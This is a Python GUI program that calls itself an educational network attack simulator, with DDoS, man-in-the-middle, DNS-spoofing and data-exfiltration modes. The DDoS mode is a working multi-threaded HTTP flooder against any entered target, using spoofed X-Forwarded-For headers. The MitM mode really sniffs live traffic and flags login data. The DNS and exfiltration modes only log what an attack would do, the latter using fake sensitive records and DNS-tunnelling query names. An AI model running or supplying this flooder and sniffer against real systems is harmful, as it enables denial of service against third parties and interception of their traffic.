import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
import threading
import time
import random
import socket
import requests
import sys
import os
import logging
import io
from datetime import datetime

# Check for Scapy availability - we'll import it when needed
try:
    from scapy.all import *
    from scapy.layers.dns import DNS, DNSQR, DNSRR
    from scapy.layers.http import HTTPRequest, HTTPResponse
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Banner
BANNER = """
╔═════════════════════════════════════════════════╗
║  Network Attack Simulator (Educational Purpose) ║
║  CAUTION: Use only in controlled environments   ║
╚═════════════════════════════════════════════════╝
"""

class LogRedirector(io.StringIO):
    def __init__(self, text_widget, tag=None):
        super().__init__()
        self.text_widget = text_widget
        self.tag = tag

    def write(self, string):
        self.text_widget.config(state=tk.NORMAL)
        self.text_widget.insert(tk.END, string, self.tag)
        self.text_widget.see(tk.END)
        self.text_widget.config(state=tk.DISABLED)

    def flush(self):
        pass

class NetworkSimulatorGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Network Attack Simulator")
        self.root.geometry("800x600")
        self.root.minsize(800, 600)
        
        self.simulator = None
        self.simulation_running = False
        
        # Configure logging
        self.setup_logging()
        
        # Create GUI components
        self.create_widgets()
        
        # Display banner
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, BANNER, "banner")
        self.log_text.insert(tk.END, "\nWelcome to the Network Attack Simulator GUI\n", "info")
        self.log_text.insert(tk.END, "This tool is for educational purposes only.\n\n", "warning")
        
        # Check for Scapy
        if not SCAPY_AVAILABLE:
            self.log_text.insert(tk.END, "WARNING: Scapy is not installed. Some features will be limited.\n", "error")
            self.log_text.insert(tk.END, "Install Scapy with: pip install scapy\n\n", "info")
        
        # Check for root/admin privileges
        if os.name == 'posix' and os.geteuid() != 0:
            self.log_text.insert(tk.END, "WARNING: Not running with root privileges. Some features may not work correctly.\n", "warning")
            self.log_text.insert(tk.END, "Consider running with sudo for full functionality.\n\n", "info")
        
        self.log_text.config(state=tk.DISABLED)
        
    def setup_logging(self):
        # Configure logger
        self.logger = logging.getLogger('NetworkSimulator')
        self.logger.setLevel(logging.INFO)
        
        # Remove any existing handlers
        for handler in self.logger.handlers[:]:
            self.logger.removeHandler(handler)
        
        # We'll add a handler in create_widgets after the text widget is created
    
    def create_widgets(self):
        # Create frame for controls
        control_frame = ttk.Frame(self.root, padding="10")
        control_frame.pack(fill=tk.X)
        
        # Target section
        ttk.Label(control_frame, text="Target:").grid(column=0, row=0, sticky=tk.W, padx=5, pady=5)
        self.target_var = tk.StringVar()
        self.target_entry = ttk.Entry(control_frame, textvariable=self.target_var, width=30)
        self.target_entry.grid(column=1, row=0, sticky=tk.W, padx=5, pady=5)
        ttk.Label(control_frame, text="(URL or IP)").grid(column=2, row=0, sticky=tk.W, padx=5, pady=5)
        
        # Attack type section
        ttk.Label(control_frame, text="Attack Type:").grid(column=0, row=1, sticky=tk.W, padx=5, pady=5)
        self.attack_var = tk.StringVar(value="ddos")
        attack_combo = ttk.Combobox(control_frame, textvariable=self.attack_var, width=15)
        attack_combo['values'] = ('ddos', 'mitm', 'dns', 'exfiltration')
        attack_combo['state'] = 'readonly'
        attack_combo.grid(column=1, row=1, sticky=tk.W, padx=5, pady=5)
        
        # Duration section
        ttk.Label(control_frame, text="Duration (sec):").grid(column=0, row=2, sticky=tk.W, padx=5, pady=5)
        self.duration_var = tk.IntVar(value=30)
        duration_spin = ttk.Spinbox(control_frame, from_=5, to=300, textvariable=self.duration_var, width=5)
        duration_spin.grid(column=1, row=2, sticky=tk.W, padx=5, pady=5)
        
        # Intensity section
        ttk.Label(control_frame, text="Intensity:").grid(column=0, row=3, sticky=tk.W, padx=5, pady=5)
        self.intensity_var = tk.DoubleVar(value=1.0)
        intensity_scale = ttk.Scale(control_frame, from_=0.1, to=10.0, variable=self.intensity_var, 
                                    orient=tk.HORIZONTAL, length=200)
        intensity_scale.grid(column=1, row=3, sticky=tk.W, padx=5, pady=5)
        self.intensity_label = ttk.Label(control_frame, text="1.0")
        self.intensity_label.grid(column=2, row=3, sticky=tk.W, padx=5, pady=5)
        intensity_scale.config(command=self.update_intensity_label)
        
        # Buttons
        button_frame = ttk.Frame(control_frame)
        button_frame.grid(column=0, row=4, columnspan=3, pady=10)
        
        self.start_button = ttk.Button(button_frame, text="Start Simulation", command=self.start_simulation)
        self.start_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = ttk.Button(button_frame, text="Stop Simulation", command=self.stop_simulation, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=5)
        
        ttk.Button(button_frame, text="Clear Log", command=self.clear_log).pack(side=tk.LEFT, padx=5)
        
        ttk.Button(button_frame, text="Exit", command=self.on_exit).pack(side=tk.LEFT, padx=5)
        
        # Progress bar
        self.progress_var = tk.DoubleVar()
        self.progress = ttk.Progressbar(control_frame, variable=self.progress_var, maximum=100)
        self.progress.grid(column=0, row=5, columnspan=3, sticky=(tk.W, tk.E), padx=5, pady=5)
        
        # Create log display
        log_frame = ttk.LabelFrame(self.root, text="Simulation Log")
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, state=tk.DISABLED)
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        # Configure text tags for different log levels
        self.log_text.tag_configure("info", foreground="blue")
        self.log_text.tag_configure("warning", foreground="orange")
        self.log_text.tag_configure("error", foreground="red")
        self.log_text.tag_configure("banner", foreground="green")
        
        # Add log handler now that we have the text widget
        self.log_handler = logging.StreamHandler(LogRedirector(self.log_text, "info"))
        self.log_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
        self.logger.addHandler(self.log_handler)
        
        # Status bar
        self.status_var = tk.StringVar(value="Ready")
        status_bar = ttk.Label(self.root, textvariable=self.status_var, relief=tk.SUNKEN, anchor=tk.W)
        status_bar.pack(side=tk.BOTTOM, fill=tk.X)
    
    def update_intensity_label(self, value):
        """Update the intensity label when the slider changes"""
        self.intensity_label.config(text=f"{float(value):.1f}")
    
    def clear_log(self):
        """Clear the log text widget"""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.delete(1.0, tk.END)
        self.log_text.insert(tk.END, BANNER, "banner")
        self.log_text.insert(tk.END, "\n", "info")
        self.log_text.config(state=tk.DISABLED)
    
    def start_simulation(self):
        """Start the network attack simulation"""
        # Validate inputs
        target = self.target_var.get().strip()
        if not target:
            messagebox.showerror("Error", "Please enter a target URL or IP address")
            return
        
        attack_type = self.attack_var.get()
        duration = self.duration_var.get()
        intensity = self.intensity_var.get()
        
        # Check if we need Scapy for this simulation
        if not SCAPY_AVAILABLE and attack_type in ['mitm', 'dns']:
            messagebox.showerror("Error", "This attack type requires Scapy, which is not installed")
            return
        
        # Disable start button, enable stop button
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        self.simulation_running = True
        
        # Determine if target is URL or IP
        target_url = None
        target_ip = None
        
        if '://' in target or '.' in target and not target.replace('.', '').isdigit():
            target_url = target
        else:
            target_ip = target
        
        # Create the simulator instance
        self.simulator = NetworkSimulator(
            target_url=target_url,
            target_ip=target_ip,
            attack_type=attack_type,
            duration=duration,
            intensity=intensity,
            logger=self.logger,
            gui=self
        )
        
        # Start the simulation in a separate thread
        sim_thread = threading.Thread(target=self.run_simulation)
        sim_thread.daemon = True
        sim_thread.start()
        
        # Start the progress updater
        self.progress_var.set(0)
        self.update_progress(duration)
        
        self.status_var.set(f"Running {attack_type} simulation against {target}...")
    
    def run_simulation(self):
        """Run the simulation in a background thread"""
        try:
            self.simulator.start_simulation()
        except Exception as e:
            self.logger.error(f"Error in simulation: {e}")
            self.root.after(0, lambda: messagebox.showerror("Error", f"Simulation error: {e}"))
            self.root.after(0, self.reset_ui)
    
    def update_progress(self, duration):
        """Update the progress bar during simulation"""
        if not self.simulation_running:
            return
            
        elapsed = time.time() - self.simulator.start_time if self.simulator else 0
        progress = min(100, (elapsed / duration) * 100)
        self.progress_var.set(progress)
        
        if elapsed < duration and self.simulation_running:
            self.root.after(500, lambda: self.update_progress(duration))
        else:
            self.root.after(1000, self.reset_ui)
    
    def stop_simulation(self):
        """Stop the ongoing simulation"""
        if self.simulator:
            self.simulator.stop_simulation()
        
        self.simulation_running = False
        self.reset_ui()
        self.status_var.set("Simulation stopped by user")
    
    def reset_ui(self):
        """Reset the UI after simulation completes or is stopped"""
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        self.progress_var.set(0)
        self.simulation_running = False
        if self.simulator and self.simulator.completed:
            self.status_var.set("Simulation completed")
        else:
            self.status_var.set("Ready")
    
    def on_exit(self):
        """Handle application exit"""
        if self.simulation_running:
            if messagebox.askyesno("Confirm Exit", "A simulation is still running. Do you want to exit anyway?"):
                self.stop_simulation()
                self.root.destroy()
        else:
            self.root.destroy()


class NetworkSimulator:
    def __init__(self, target_url=None, target_ip=None, attack_type=None, duration=10, intensity=1, logger=None, gui=None):
        self.target_url = target_url
        self.target_ip = target_ip
        self.attack_type = attack_type
        self.duration = duration
        self.intensity = intensity
        self.logger = logger or logging.getLogger('NetworkSimulator')
        self.gui = gui
        self.running = False
        self.completed = False
        self.threads = []
        self.start_time = 0
        
        # Extract domain and IP if URL is provided
        if self.target_url and not self.target_ip:
            try:
                self.target_domain = self.target_url.split("://")[-1].split("/")[0]
                self.target_ip = socket.gethostbyname(self.target_domain)
                self.logger.info(f"Resolved {self.target_domain} to {self.target_ip}")
            except Exception as e:
                self.logger.error(f"Failed to resolve domain: {e}")
                self.target_ip = "127.0.0.1"  # Fallback
    
    def start_simulation(self):
        """Start the selected attack simulation"""
        self.logger.info(f"Starting {self.attack_type} simulation against {self.target_url or self.target_ip}")
        self.logger.info(f"Duration: {self.duration} seconds, Intensity: {self.intensity}")
        self.logger.info("NOTE: This is a simulation for educational purposes only.")
        
        self.running = True
        self.start_time = time.time()
        
        if self.attack_type == "ddos":
            self.simulate_ddos()
        elif self.attack_type == "mitm":
            self.simulate_mitm()
        elif self.attack_type == "dns":
            self.simulate_dns_spoofing()
        elif self.attack_type == "exfiltration":
            self.simulate_data_exfiltration()
        else:
            self.logger.error(f"Unknown attack type: {self.attack_type}")
            return
        
        # Set a timer to stop the simulation
        timer = threading.Timer(self.duration, self.stop_simulation)
        timer.daemon = True
        timer.start()
    
    def stop_simulation(self):
        """Stop all running simulations"""
        if not self.running:
            return
            
        self.logger.info("Stopping simulation...")
        self.running = False
        
        # Wait for all threads to complete
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        self.logger.info("Simulation completed")
        self.completed = True
    
    def simulate_ddos(self):
        """Simulate DDoS attack by sending multiple requests"""
        if not self.target_url:
            self.logger.error("Target URL is required for DDoS simulation")
            return
        
        self.logger.info(f"Simulating DDoS attack on {self.target_url}")
        self.logger.info("Creating multiple worker threads...")
        
        # Create multiple threads based on intensity
        thread_count = max(1, min(20, int(self.intensity * 5)))
        
        for i in range(thread_count):
            thread = threading.Thread(target=self._ddos_worker)
            thread.daemon = True
            self.threads.append(thread)
            thread.start()
            
        self.logger.info(f"Started {thread_count} attack threads")
    
    def _ddos_worker(self):
        """Worker function for DDoS simulation"""
        counter = 0
        start_time = time.time()
        
        # Different request types to simulate
        methods = ['GET', 'POST', 'HEAD', 'OPTIONS']
        paths = ['/', '/api', '/login', '/admin', '/data', '/images', '/search']
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 10; Mobile) AppleWebKit/537.36'
        ]
        
        while self.running:
            try:
                # Select random characteristics for this request
                method = random.choice(methods)
                path = random.choice(paths)
                user_agent = random.choice(user_agents)
                
                # Construct URL
                if '://' in self.target_url:
                    base_url = self.target_url
                    if base_url.endswith('/'):
                        base_url = base_url[:-1]
                else:
                    base_url = f"http://{self.target_url}"
                
                # Add random query parameters
                if method == 'GET':
                    url = f"{base_url}{path}?param={random.randint(1000, 9999)}&ts={int(time.time())}"
                else:
                    url = f"{base_url}{path}"
                
                # Set headers
                headers = {
                    'User-Agent': user_agent,
                    'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
                    'Accept': 'text/html,application/json,*/*',
                    'Connection': 'keep-alive' if random.random() > 0.5 else 'close'
                }
                
                # Send request
                if method == 'GET':
                    requests.get(url, headers=headers, timeout=1)
                elif method == 'POST':
                    requests.post(url, headers=headers, data={'data': 'x' * random.randint(10, 100)}, timeout=1)
                elif method == 'HEAD':
                    requests.head(url, headers=headers, timeout=1)
                elif method == 'OPTIONS':
                    requests.options(url, headers=headers, timeout=1)
                
                counter += 1
                # Throttle based on intensity (lower intensity = more sleep)
                time.sleep(max(0.01, 0.5 / self.intensity))
                
                # Periodically log progress
                if counter % 20 == 0:
                    elapsed = time.time() - start_time
                    rate = counter / elapsed if elapsed > 0 else 0
                    self.logger.info(f"Thread sent {counter} requests ({rate:.2f} req/s)")
                    
            except requests.exceptions.RequestException:
                # Silently ignore connection errors
                pass
            except Exception as e:
                self.logger.error(f"Error in DDoS worker: {e}")
    
    def simulate_mitm(self):
        """Simulate Man-in-the-Middle attack"""
        self.logger.info("Simulating Man-in-the-Middle (MitM) attack")
        self.logger.info("Monitoring and logging network traffic")
        
        # Create a thread for the MitM simulation
        thread = threading.Thread(target=self._mitm_worker)
        thread.daemon = True
        self.threads.append(thread)
        thread.start()
    
    def _mitm_worker(self):
        """Worker for MitM simulation"""
        if not SCAPY_AVAILABLE:
            self.logger.error("Scapy is required for MitM simulation")
            return
            
        # This is a simulated MitM - we'll just sniff packets and log them
        def packet_callback(packet):
            if not self.running:
                return
            
            # Check if packet has HTTP layer
            if TCP in packet and packet[TCP].dport == 80:
                self.logger.info(f"[MitM] Captured TCP traffic: {packet[IP].src} -> {packet[IP].dst} on port {packet[TCP].dport}")
                
                # If Raw layer exists, try to parse HTTP
                if Raw in packet:
                    payload = packet[Raw].load.decode('utf-8', errors='ignore')
                    if payload.startswith('GET') or payload.startswith('POST'):
                        self.logger.info(f"[MitM] HTTP Request: {payload.splitlines()[0]}")
                        # Look for potential sensitive data
                        if 'password' in payload.lower() or 'username' in payload.lower() or 'login' in payload.lower():
                            self.logger.warning(f"[MitM] Potential sensitive data detected in HTTP request")
            
            # Log DNS queries
            if DNS in packet and packet.haslayer(DNSQR):
                query = packet[DNSQR].qname.decode()
                self.logger.info(f"[MitM] DNS Query: {query}")
        
        try:
            self.logger.info("Starting network sniffing (simulated MitM)...")
            if self.target_ip:
                # Filter to only capture packets related to the target
                filter_str = f"host {self.target_ip}"
                self.logger.info(f"Filter: {filter_str}")
                sniff(filter=filter_str, prn=packet_callback, store=0, timeout=self.duration)
            else:
                # Capture all packets if no specific target
                sniff(prn=packet_callback, store=0, timeout=self.duration)
        except Exception as e:
            self.logger.error(f"Error in MitM simulation: {e}")
    
    def simulate_dns_spoofing(self):
        """Simulate DNS spoofing attack"""
        self.logger.info("Simulating DNS spoofing attack")
        
        # Create a thread for DNS spoofing simulation
        thread = threading.Thread(target=self._dns_spoof_worker)
        thread.daemon = True
        self.threads.append(thread)
        thread.start()
    
    def _dns_spoof_worker(self):
        """Worker for DNS spoofing simulation"""
        if not SCAPY_AVAILABLE:
            self.logger.error("Scapy is required for DNS spoofing simulation")
            return
            
        spoofed_domains = [
            "example.com", 
            "bank.com", 
            "login.service.com",
            "mail.provider.com",
            "secure.shopping.com"
        ]
        spoofed_ip = "192.168.1.100"  # Simulated malicious IP
        
        self.logger.info(f"Monitoring for DNS queries to spoof...")
        
        def dns_spoof_callback(packet):
            if not self.running:
                return
            
            # Check if packet is a DNS query
            if DNS in packet and packet.haslayer(DNSQR):
                qname = packet[DNSQR].qname.decode()
                
                # Check if query is for a domain we want to spoof
                for domain in spoofed_domains:
                    if domain in qname:
                        self.logger.warning(f"[DNS Spoof] Would spoof query for {qname} to point to {spoofed_ip}")
                        
                        # Log the details of what a real attack would do
                        src_ip = packet[IP].src
                        dst_ip = packet[IP].dst
                        self.logger.info(f"[DNS Spoof] Query from {src_ip} to DNS server {dst_ip}")
                        self.logger.info(f"[DNS Spoof] In a real attack, would send spoofed response to {src_ip}")
                        
                        # Display DNS record that would be spoofed
                        self.logger.info(f"[DNS Spoof] Original query: {qname}, Type: {packet[DNSQR].qtype}")
                        self.logger.info(f"[DNS Spoof] Spoofed answer would be: {qname} -> {spoofed_ip}")
                        return
        
        try:
            # Sniff DNS traffic
            sniff(filter="udp port 53", prn=dns_spoof_callback, store=0, timeout=self.duration)
        except Exception as e:
            self.logger.error(f"Error in DNS spoofing simulation: {e}")
    
    def simulate_data_exfiltration(self):
        """Simulate data exfiltration attack"""
        self.logger.info("Simulating data exfiltration attack")
        
        # Create a thread for data exfiltration simulation
        thread = threading.Thread(target=self._exfiltration_worker)
        thread.daemon = True
        self.threads.append(thread)
        thread.start()
    
    def _exfiltration_worker(self):
        """Worker for data exfiltration simulation"""
        # Generate some fake sensitive data
        sensitive_data = [
            "CREDIT_CARD: 4532-1565-7325-4312",
            "SSN: 078-05-1120",
            "PASSWORD: Pa$$w0rd123!",
            "API_KEY: sk_test_4eC39HqLyjWDarjtT1zdp7dc",
            "DATABASE_CREDENTIALS: db_user:s3cretP@ss",
            "EMPLOYEE_ID: EMP-42591",
            "CONTRACT_DETAILS: Confidential Revenue $2.5M",
            "CUSTOMER_RECORD: John Smith, 123 Main St, 555-123-4567"
        ]
        
        # Simulate different exfiltration methods
        exfil_methods = ["dns", "http", "icmp", "steganography"]
        
        self.logger.info("Starting data exfiltration simulation...")
        self.logger.info("This will simulate various methods to exfiltrate data")
        
        counter = 0
        start_time = time.time()
        
        while self.running:
            try:
                # Pick a random piece of data and exfiltration method
                data = random.choice(sensitive_data)
                method = random.choice(exfil_methods)
                
                self.logger.warning(f"[Exfiltration] Simulating {method.upper()} exfiltration")
                self.logger.info(f"[Exfiltration] Data would be exfiltrated: {data[:10]}...")
                
                # Simulate the specific exfiltration method
                if method == "dns":
                    # DNS exfiltration would encode data in DNS queries
                    encoded_data = data.replace(" ", "-").replace(":", ".")
                    chunks = [encoded_data[i:i+20] for i in range(0, len(encoded_data), 20)]
                    for i, chunk in enumerate(chunks):
                        domain = f"{chunk}.exfil.example.com"
                        self.logger.info(f"[DNS Exfil] Chunk {i+1}: Would query {domain}")
                
                elif method == "http":
                    # HTTP exfiltration would hide data in requests
                    self.logger.info(f"[HTTP Exfil] Would send request with hidden data in headers")
                
                elif method == "icmp":
                    # ICMP exfiltration hides data in ping packets
                    self.logger.info(f"[ICMP Exfil] Would send ping with {len(data)} bytes of hidden data")
                
                elif method == "steganography":
                    # Steganography hides data in files
                    self.logger.info(f"[Stego Exfil] Would hide {len(data)} bytes in image file")
                
                counter += 1
                # Log progress periodically
                if counter % 5 == 0:
                    elapsed = time.time() - start_time
                    rate = counter / elapsed if elapsed > 0 else 0
                    self.logger.info(f"Simulated {counter} exfiltration attempts ({rate:.2f}/s)")
                
                # Sleep between attempts based on intensity
                time.sleep(max(0.5, 2.0 / self.intensity))
                
            except Exception as e:
                self.logger.error(f"Error in exfiltration simulation: {e}")


if __name__ == "__main__":
    # Create the main application window
    root = tk.Tk()
    app = NetworkSimulatorGUI(root)
    
    # Handle window close event
    root.protocol("WM_DELETE_WINDOW", app.on_exit)
    
    # Start the application
    root.mainloop()